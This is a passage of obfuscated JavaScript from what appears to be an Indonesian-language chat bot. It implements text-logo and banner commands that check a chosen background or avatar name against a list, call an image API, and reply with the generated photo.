_0x1ce978[_0x240d04(0x1942)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x6be)](_0x1ec495,_0x3e6565)+('\x20teks1|tek'+'s2|thumb`\x0a'+'\x0aContoh\x20pe'+_0x240d04(0x2816)+'`')+_0x1ce978[_0x240d04(0x27c)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+'ofc|z`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x1ce978[_0x240d04(0x2dde)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x1547)+_0x240d04(0x97b)+_0x240d04(0x2816)+'`')+_0x1ce978[_0x240d04(0x18ef)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xe81)));const _0x1164e7=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','z'];if(!_0x1164e7['includes'](_0x345085)){if(_0x1ce978[_0x240d04(0x2d21)]!==_0x1ce978['CjnJD']){let _0x3dadb6=_0x3ff7b2[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x15d0)](_0x1e3ccc,0x36ee80)),_0x46d8a0=_0x1ce978['OtjBf'](_0x2b6bcb[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x192c)](_0x1232e2,0xea60)),0x3c),_0x423045=_0x2604d6[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x200a)](_0xa341db,0x3e8))%0x3c;return[_0x3dadb6,_0x46d8a0,_0x423045][_0x240d04(0x16e6)](_0x3d3f45=>_0x3d3f45[_0x240d04(0x2cb7)]()['padStart'](0x2,0x0))[_0x240d04(0x86e)](':');}else _0x1ce978['GqMCL'](_0x555a99,_0x1164e7,_0x1164e7[_0x240d04(0x2b45)],_0x1ce978['wwBUQ']);}else{if(_0x1ce978['IJEJN'](_0x1ce978[_0x240d04(0x2ec5)],_0x1ce978[_0x240d04(0x1c6f)]))_0x3c3681[_0xfa7ee7]+=_0x4bff0e[_0x547496];else{_0x476bfb(lang[_0x240d04(0x172a)]);let _0x1c520d=_0x1ce978['EAhJn'](api,_0x1ce978['WtcHl'],_0x1ce978['MzwvF'](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'thumb':_0x345085},_0x1ce978['EEoOe']),_0x2f8f31=await _0x1ce978[_0x240d04(0x369)](fetch,_0x1c520d);if(!_0x2f8f31['ok'])throw await _0x2f8f31['text']();_0x23c0de['replyWithP'+'hoto']({'url':_0x1c520d},{'caption':lang['ok']});}}}}break;case _0x1ce978[_0x240d04(0x1ecd)]:{if(!_0x33cfb1)return _0x1ce978['BmFMB'](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x1178)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+_0x240d04(0xa0c)+'oh\x20penggun'+_0x240d04(0xbbe))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xbec)+_0x240d04(0x471)));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x334)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x2b96)+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+'aan:\x0a`')+_0x1ce978[_0x240d04(0xa08)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xbec)+_0x240d04(0x471)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1ac4)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+'s2|backgro'+_0x240d04(0xa0c)+'oh\x20penggun'+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0x459)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'ofc|reinha'+_0x240d04(0x471)));const _0x4237d4=[_0x1ce978[_0x240d04(0xf70)],_0x1ce978[_0x240d04(0x2567)],_0x1ce978[_0x240d04(0xaf2)],_0x1ce978[_0x240d04(0x120a)],_0x240d04(0x22f6),_0x1ce978[_0x240d04(0x2b8c)],_0x1ce978[_0x240d04(0x151f)],_0x1ce978[_0x240d04(0x221e)],_0x1ce978[_0x240d04(0x2b93)],_0x1ce978[_0x240d04(0x12af)],_0x1ce978[_0x240d04(0x597)],'dva',_0x240d04(0x2c54),_0x1ce978['JgUIS'],_0x1ce978['yHYzc']];if(!_0x4237d4[_0x240d04(0x55c)](_0x345085)){if(_0x1ce978[_0x240d04(0x27f1)](_0x240d04(0x2cba),_0x1ce978[_0x240d04(0x70a)]))_0x1ce978[_0x240d04(0x69a)](_0x555a99,_0x4237d4,_0x4237d4[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2a3c)]);else return _0x1ce978[_0x240d04(0x2a98)](_0x3bbb08,_0x1ce978[_0x240d04(0x1453)]);}else{if(_0x1ce978[_0x240d04(0x21e6)](_0x1ce978[_0x240d04(0xb0d)],_0x1ce978[_0x240d04(0x2c89)])){_0x1ce978['hYqcq'](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x336612=_0x1ce978[_0x240d04(0x153f)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x1e18)](_0x1ce978['jrCNG'],_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'background':_0x345085},'apikey'),_0x579323=await _0x1ce978[_0x240d04(0xc77)](fetch,_0x336612);if(!_0x579323['ok'])throw await _0x579323[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x336612},{'caption':lang['ok']});}else{let _0x5bc38d=_0x192be6[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x23e0)](_0x4ba099,0x36ee80)),_0x265397=_0xeafe99['floor'](_0x1ce978[_0x240d04(0x15d0)](_0x7f8c2d,0xea60))%0x3c,_0xd74ba8=_0x1ce978[_0x240d04(0xf46)](_0x320832[_0x240d04(0xf02)](_0x3664e1/0x3e8),0x3c);return[_0x5bc38d,_0x265397,_0xd74ba8][_0x240d04(0x16e6)](_0x33c3e8=>_0x33c3e8['toString']()['padStart'](0x2,'0'))[_0x240d04(0x86e)](':');}}}break;case _0x1ce978[_0x240d04(0x1d94)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x85d)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['JnCcg'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0x1561)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x256c)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb(_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['CKprF'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+'s2|backgro'+_0x240d04(0xa0c)+'oh\x20penggun'+'aan:\x0a`')+(_0x1ec495+_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x256c)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x476bfb(_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x2e4a)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+'s2|backgro'+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+'aan:\x0a`')+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x256c)));const _0x56d061=[_0x1ce978['BEYvr'],_0x1ce978['YIEZm'],_0x1ce978['QzeFc'],_0x1ce978[_0x240d04(0x18a8)],'bg2',_0x1ce978[_0x240d04(0x1f9d)]];if(!_0x56d061[_0x240d04(0x55c)](_0x345085))_0x555a99(_0x56d061,_0x56d061[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2a3c)]);else{_0x476bfb(lang[_0x240d04(0x172a)]);let _0x5d243e=api(_0x240d04(0x10a),_0x1ce978[_0x240d04(0x284e)]+_0x3e6565,{'text':_0x2b7b14,'text2':_0x83dd4c,'background':_0x345085},_0x1ce978[_0x240d04(0x2536)]),_0x3f38ea=await fetch(_0x5d243e);if(!_0x3f38ea['ok'])throw await _0x3f38ea[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x5d243e},{'caption':lang['ok']});}}break;case _0x240d04(0x18db)+'bg':{if(_0x1ce978[_0x240d04(0x236b)]!==_0x1ce978[_0x240d04(0x2d5e)]){if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x27d4)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0xaa7)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x2b96)+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x501)));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x2559)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x2822)+'s2|backgro'+_0x240d04(0xa0c)+'oh\x20penggun'+'aan:\x0a`')+_0x1ce978[_0x240d04(0x1694)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x501)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x476bfb(_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x260e)](_0x1ec495,_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x2b96)+_0x240d04(0xa0c)+_0x240d04(0x1f7a)+_0x240d04(0xbbe))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+'ofc|bg2`'));const _0x5c8b40=[_0x1ce978['uaOHY'],'bg10',_0x1ce978[_0x240d04(0x170a)],_0x1ce978[_0x240d04(0x646)],_0x1ce978['Tastj'],_0x1ce978[_0x240d04(0x23eb)],_0x1ce978[_0x240d04(0xbf4)],_0x1ce978[_0x240d04(0xeef)],_0x240d04(0x1b65),_0x1ce978[_0x240d04(0x1019)],_0x1ce978['MrLMy']];if(!_0x5c8b40[_0x240d04(0x55c)](_0x345085))_0x1ce978[_0x240d04(0x1c10)](_0x1ce978[_0x240d04(0x12c6)],_0x240d04(0x1882))?_0x1ce978[_0x240d04(0xb74)](_0x53b865,_0x2eac6d,_0x58bc81['length'],'avatar'):_0x1ce978[_0x240d04(0x1ba)](_0x555a99,_0x5c8b40,_0x5c8b40[_0x240d04(0x2b45)],_0x1ce978['lqTbJ']);else{if(_0x1ce978[_0x240d04(0x11de)]!==_0x1ce978[_0x240d04(0x11de)])_0x19faf2=_0x3f0b7f[_0x240d04(0x728)](0x1);else{_0x476bfb(lang[_0x240d04(0x172a)]);let _0x45a8c6=api(_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x2577)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'background':_0x345085},_0x1ce978['EEoOe']),_0x17b7c0=await _0x1ce978['SvwvB'](fetch,_0x45a8c6);if(!_0x17b7c0['ok'])throw await _0x17b7c0[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x45a8c6},{'caption':lang['ok']});}}}else return{'reward':{'exp':0x3e8,'trash':0x65,'string':0x19,'rock':0x1e,'iron':0x19,'diamond':0xa,'emerald':0x4,'common':_0x1ce978[_0x240d04(0x1ae3)](0x2,_0x1ce978[_0x240d04(0x287a)](_0x1ce978[_0x240d04(0x1716)](_0x59ab36[_0x240d04(0x2775)],0x2)?0x2:_0x4e19ae[_0x240d04(0x2775)],1.2)||0x1),'uncommon':[0x0,0x0,0x0,0x1,0x0][_0x240d04(0x17f0)](new _0x433ecc(_0x1ce978[_0x240d04(0x16db)](0x5,_0x1ce978['LLIVy'](_0x36dea3[_0x240d04(0x2775)],0x2)&&_0x210b41[_0x240d04(0x2775)]<0x6&&_0x309cc7['dog']||_0x1ce978[_0x240d04(0x220a)](_0x316272[_0x240d04(0x2775)],0x5)&&0x5||0x2))['fill'](0x0)),'mythic':[0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0][_0x240d04(0x17f0)](new _0x49c3e4(0x8-(_0x1ce978[_0x240d04(0x17ff)](_0x3b5ba6[_0x240d04(0x2775)],0x5)&&_0x1ce978[_0x240d04(0xf94)](_0x418b0a[_0x240d04(0x2775)],0x8)&&_0xaf190f[_0x240d04(0x2775)]||_0x11cd91[_0x240d04(0x2775)]>0x7&&0x8||0x3))['fill'](0x0)),'legendary':[0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0][_0x240d04(0x17f0)](new _0x5531e4(_0x1ce978[_0x240d04(0x16db)](0xa,_0x3011d1[_0x240d04(0x2775)]||0x4))[_0x240d04(0x12bf)](0x0)),'gold':[0x0,0x0,0x0,0x0,0x0,0x1,0x0],'diamond':[0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0][_0x240d04(0x17f0)](new _0x176fb4(_0x1ce978[_0x240d04(0xdd)](0x5,_0x1ce978[_0x240d04(0xf94)](_0x4eceff[_0x240d04(0x1ae7)],0x6)&&_0x254fac[_0x240d04(0x1ae7)]||_0x1ce978['iGvTk'](_0x3e258e['fox'],0x5)&&0x5||0x0))['fill'](0x0))},'lost':{'health':_0x1ce978[_0x240d04(0xdd)](0x28,_0x1ce978['qeTUa'](_0x339d16[_0x240d04(0x2ff)]||0x0,0x4)),'pickaxedurability':0xa}};}break;case _0x240d04(0x26e9)+'e':{if(_0x1ce978['CGPyU']('zVGtv',_0x1ce978['bbtFF'])){if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2308)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20teks1|tek'+_0x240d04(0x1547)+_0x240d04(0x97b)+_0x240d04(0x2816)+'`')+(_0x1ec495+_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x1242)+'e`'));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x6fc)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2071)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x1547)+_0x240d04(0x97b)+_0x240d04(0x2816)+'`')+_0x1ce978[_0x240d04(0x22aa)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'ofc|kitsun'+'e`'));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c['split']('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x1ce978[_0x240d04(0x180a)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x183e)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x1547)+_0x240d04(0x97b)+_0x240d04(0x2816)+'`')+_0x1ce978[_0x240d04(0x20fc)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1242)+'e`'));const _0x42c208=[_0x1ce978[_0x240d04(0x14c2)],_0x1ce978[_0x240d04(0x2aa2)],_0x1ce978[_0x240d04(0x2110)],'skull-3','skull-cybo'+'rg',_0x1ce978['pZbDi'],_0x1ce978[_0x240d04(0x2009)],_0x1ce978[_0x240d04(0xc8f)],_0x1ce978[_0x240d04(0x13bd)],_0x240d04(0x140b),_0x1ce978[_0x240d04(0xda6)],_0x240d04(0xa9e),_0x1ce978[_0x240d04(0x209f)],_0x1ce978[_0x240d04(0x1c74)],_0x1ce978['pGBnD'],_0x1ce978[_0x240d04(0x2a2)],_0x1ce978[_0x240d04(0x2e55)],_0x240d04(0xdc9),_0x1ce978[_0x240d04(0x1352)],_0x1ce978['srfEq'],_0x240d04(0x244a),'horse-2',_0x1ce978[_0x240d04(0x2dc0)],_0x1ce978['fqtIj'],_0x1ce978[_0x240d04(0xee8)],_0x1ce978[_0x240d04(0x184)],'assassin',_0x1ce978[_0x240d04(0x2bfc)],_0x1ce978['dRMPu'],_0x1ce978[_0x240d04(0x17f6)],_0x1ce978[_0x240d04(0x28bf)],_0x1ce978[_0x240d04(0x2d5b)],_0x1ce978['yDaFp'],_0x1ce978[_0x240d04(0x2bbb)],_0x1ce978['vrELb'],_0x1ce978[_0x240d04(0x1e8d)],_0x1ce978[_0x240d04(0x10bc)],_0x1ce978['rrGWj'],_0x1ce978['yiwAD'],_0x1ce978['HjaXA'],_0x1ce978[_0x240d04(0x2020)],_0x1ce978[_0x240d04(0x2b6f)],_0x240d04(0xf4d),_0x240d04(0xa77),_0x240d04(0x1980),_0x1ce978['VZrnn'],_0x1ce978['sKNFe'],_0x1ce978['oafWf'],_0x1ce978['scdBV'],_0x1ce978[_0x240d04(0x1767)],_0x1ce978['HgZBV'],_0x240d04(0x2560),'goat','fox',_0x1ce978[_0x240d04(0x102)],_0x240d04(0x174e),_0x240d04(0x27ea),_0x1ce978[_0x240d04(0x27b2)],_0x1ce978[_0x240d04(0x27cf)],_0x240d04(0x2759),_0x1ce978['EVgNd'],_0x1ce978[_0x240d04(0x5fa)],_0x1ce978[_0x240d04(0x588)],_0x240d04(0x2cc0),_0x1ce978[_0x240d04(0x21be)],_0x1ce978[_0x240d04(0x1106)],_0x1ce978[_0x240d04(0x1fe5)],_0x1ce978[_0x240d04(0x106a)],_0x240d04(0x2be),_0x240d04(0x11fc),_0x1ce978[_0x240d04(0x13ce)],_0x1ce978['CcqWx'],_0x240d04(0x2775),_0x1ce978[_0x240d04(0x283a)],_0x240d04(0x2511),_0x240d04(0xe91),_0x1ce978['KilWl'],_0x1ce978[_0x240d04(0x10ef)]];if(!_0x42c208['includes'](_0x345085))_0x555a99(_0x42c208,_0x42c208[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2405)]);else{_0x1ce978['GHKdB'](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x312054=_0x1ce978[_0x240d04(0x2a4b)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x1e77)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'thumb':_0x345085},_0x1ce978['EEoOe']),_0x1959c2=await fetch(_0x312054);if(!_0x1959c2['ok'])throw await _0x1959c2[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x312054},{'caption':lang['ok']});}}else _0x46d1d1[_0x240d04(0x15e)](_0x3e8871),_0x1ce978[_0x240d04(0x8c0)](_0x546b58,_0x1ce978['Mcmdz'](_0x1ce978['ZKIxp'],_0x4d49be[_0x240d04(0x960)]));}break;case _0x1ce978['AtUGF']:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x22e0)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x2822)+'s2|thumb`\x0a'+_0x240d04(0x97b)+_0x240d04(0x2816)+'`')+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+'ofc|lynx`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978['OnEcT'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x13b7)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x1547)+_0x240d04(0x97b)+_0x240d04(0x2816)+'`')+_0x1ce978[_0x240d04(0x241b)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x458)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x2822)+'s2|thumb`\x0a'+'\x0aContoh\x20pe'+'nggunaan:\x0a'+'`')+_0x1ce978['tuFmK'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x458)));const _0x590a52=[_0x1ce978[_0x240d04(0x21cd)],_0x240d04(0x2ab1),_0x1ce978[_0x240d04(0x2e55)],_0x240d04(0xdc9),_0x1ce978['LZqpK'],_0x1ce978[_0x240d04(0x6e3)],_0x240d04(0x34e),'horse2',_0x1ce978[_0x240d04(0x2dc0)],_0x240d04(0x2592),_0x1ce978['aTHTP'],_0x1ce978[_0x240d04(0x184)],_0x1ce978[_0x240d04(0x1a6f)],_0x1ce978[_0x240d04(0x2bfc)],_0x1ce978[_0x240d04(0x2a2)],_0x1ce978[_0x240d04(0x17f6)],_0x1ce978[_0x240d04(0x38b)],_0x1ce978[_0x240d04(0x2d5b)],_0x240d04(0x29b6),_0x240d04(0x25c0),_0x1ce978[_0x240d04(0x35d)],_0x1ce978['GqkQj'],'-2',_0x1ce978[_0x240d04(0x29e9)],_0x1ce978[_0x240d04(0x2ae2)],_0x1ce978[_0x240d04(0x23c4)],_0x240d04(0x94a),_0x1ce978[_0x240d04(0x1bba)],_0x240d04(0x4aa),_0x1ce978[_0x240d04(0x24d0)],_0x1ce978[_0x240d04(0x1767)],_0x240d04(0x1d29),'dragon',_0x1ce978['KZJPQ'],_0x1ce978[_0x240d04(0x2020)],_0x1ce978[_0x240d04(0x2b6f)],_0x1ce978['drpzd'],_0x1ce978[_0x240d04(0x19ea)],_0x1ce978['scdBV'],_0x240d04(0xd40),_0x1ce978[_0x240d04(0x104)],_0x1ce978[_0x240d04(0x25d8)],_0x1ce978[_0x240d04(0x1c81)],_0x1ce978[_0x240d04(0x1928)],'owl',_0x240d04(0x15d3),_0x1ce978[_0x240d04(0x174a)],_0x1ce978['CVuQE'],_0x1ce978[_0x240d04(0x1a51)],_0x240d04(0x83d),_0x1ce978['xIJSC'],'reaper',_0x1ce978['aCgsY'],_0x1ce978[_0x240d04(0x1106)],_0x1ce978[_0x240d04(0x283a)],_0x1ce978[_0x240d04(0x13ce)],_0x1ce978[_0x240d04(0x2962)],_0x240d04(0x26ae),_0x1ce978['CefNr'],_0x1ce978['PmgZT'],_0x1ce978[_0x240d04(0xdfb)]];if(!_0x590a52[_0x240d04(0x55c)](_0x345085)){if(_0x1ce978[_0x240d04(0x23e8)]===_0x240d04(0x16f9))return _0x4ef92b[_0x59843d]={'delay':0xfa0},_0x3fcab3(),_0x1ce978['QFHPS'](_0x1ec259,_0x1ce978[_0x240d04(0x1ac5)]);else _0x1ce978['pQpKh'](_0x555a99,_0x590a52,_0x590a52[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2405)]);}else{if(_0x1ce978[_0x240d04(0xd7)]===_0x1ce978[_0x240d04(0x1e6e)]){const _0x2d4d0c=_0x1ce978['Nicrx'](_0xb6de58,_0x3ff7ef-_0x7679b1[_0x240d04(0x2d00)+'y']),_0x2e95c6=_0x3cd771['floor'](_0x2d4d0c/_0x1ce978[_0x240d04(0x21b4)](_0x1ce978[_0x240d04(0xb4e)](_0x1ce978[_0x240d04(0xb4e)](0x3e8,0x3c),0x3c),0x18)),_0x21c405=_0x4d073b[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x22b1)](_0x2d4d0c/_0x1ce978[_0x240d04(0x2512)](_0x1ce978[_0x240d04(0x14e5)](0x3e8,0x3c),0x3c),0x18)),_0x13fd04=_0x691df1[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x22b1)](_0x1ce978[_0x240d04(0x16c)](_0x2d4d0c,_0x1ce978[_0x240d04(0x232e)](0x3e8,0x3c)),0x3c)),_0x5c8095=_0x14a1af[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x2c9d)](_0x2d4d0c/0x3e8,0x3c));return _0x583a63(_0x240d04(0x23ff)+_0x240d04(0x9b5)+'\x20bulan\x20ini'+_0x240d04(0x1c6e)+_0x2e95c6+_0x240d04(0x14e8)+_0x21c405+_0x240d04(0x2a6c)+_0x13fd04+_0x240d04(0x2eca)+_0x5c8095+(_0x240d04(0xf06)+'gi.'));}else{_0x1ce978[_0x240d04(0x1522)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x5cd05a=_0x1ce978[_0x240d04(0x27b7)](api,_0x1ce978['WtcHl'],_0x1ce978['jrCNG']+_0x3e6565,{'text':_0x2b7b14,'text2':_0x83dd4c,'thumb':_0x345085},_0x1ce978[_0x240d04(0x2536)]),_0x5c8daf=await fetch(_0x5cd05a);if(!_0x5c8daf['ok'])throw await _0x5c8daf[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x5cd05a},{'caption':lang['ok']});}}}break;case _0x1ce978['CPosT']:{if(_0x1ce978[_0x240d04(0x1fff)](_0x1ce978[_0x240d04(0xa13)],_0x1ce978[_0x240d04(0xa13)]))return _0x1ce978[_0x240d04(0xc77)](_0x2823d6,_0x240d04(0x1e4c)+'ak\x20punya\x20c'+_0x240d04(0x1039)+_0x5b640f(_0x32b8b1)+(_0x240d04(0x2441)+_0x240d04(0x23dd)+_0x240d04(0x56a))+(_0xa19114[_0x3385ca]||0x0)+'*');else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2e94)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['AwWLx'](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x1547)+_0x240d04(0x97b)+_0x240d04(0x2816)+'`')+_0x1ce978[_0x240d04(0x164c)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x20d4)+'ta`'));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x22a)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x1547)+_0x240d04(0x97b)+'nggunaan:\x0a'+'`')+_0x1ce978['Sxjbu'](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x20d4)+_0x240d04(0x2ea7)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1],_0x345085=_0x58693c[_0x240d04(0x1c39)]('|')[0x2];if(!_0x345085)return _0x1ce978[_0x240d04(0x217c)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x24b2)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2822)+_0x240d04(0x1547)+'\x0aContoh\x20pe'+_0x240d04(0x2816)+'`')+_0x1ce978[_0x240d04(0x2ea2)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x20d4)+_0x240d04(0x2ea7)));const _0x413751=[_0x1ce978['cQOTd'],'mercy',_0x1ce978[_0x240d04(0x1189)],_0x1ce978[_0x240d04(0x15ce)],_0x1ce978[_0x240d04(0x2496)],_0x1ce978[_0x240d04(0xf70)],'tracer',_0x1ce978['UDYdd'],_0x1ce978['dbPpv'],_0x1ce978[_0x240d04(0x120a)],_0x1ce978[_0x240d04(0xf1c)],_0x1ce978[_0x240d04(0x29dd)],_0x1ce978[_0x240d04(0x191a)],_0x240d04(0xcb2),'reaper2',_0x1ce978[_0x240d04(0x151f)],'pharah',_0x1ce978[_0x240d04(0x221e)],_0x1ce978[_0x240d04(0x12af)],_0x1ce978[_0x240d04(0x1a74)],_0x1ce978[_0x240d04(0x20ad)],_0x1ce978['OXbfD'],'genji',_0x1ce978[_0x240d04(0x23f6)],'bastion',_0x1ce978[_0x240d04(0x1e92)],_0x1ce978[_0x240d04(0x1ce2)],_0x1ce978[_0x240d04(0x1dd7)],_0x240d04(0x21ab)];if(!_0x413751['includes'](_0x345085))_0x1ce978[_0x240d04(0x4d9)](_0x555a99,_0x413751,_0x413751['length'],_0x1ce978[_0x240d04(0x2405)]);else{if(_0x1ce978[_0x240d04(0x1559)](_0x240d04(0x2810),_0x240d04(0x2810))){_0x1ce978[_0x240d04(0x25c7)](_0x476bfb,lang[_